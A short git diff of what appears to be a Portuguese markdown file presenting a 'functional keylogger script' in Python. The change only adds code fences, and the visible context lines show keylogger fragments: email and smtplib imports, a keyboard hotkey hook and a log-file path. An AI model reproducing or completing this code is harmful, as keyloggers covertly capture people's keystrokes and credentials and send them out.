@@ -3,7 +3,7 @@ script funcional de keylogger
 
 
 ///////////////////// COdigo fonte///////////////////////////////
-
+```
 import smtplib 
 from email.mime.text import MIMEText
 from email.message import EmailMessage
@@ -64,3 +64,4 @@ keyboard.add_hotkey('a', executar_hotkey)
 print(f"O arquivo está em {data_path}")
 
 keyboard.wait()
+```
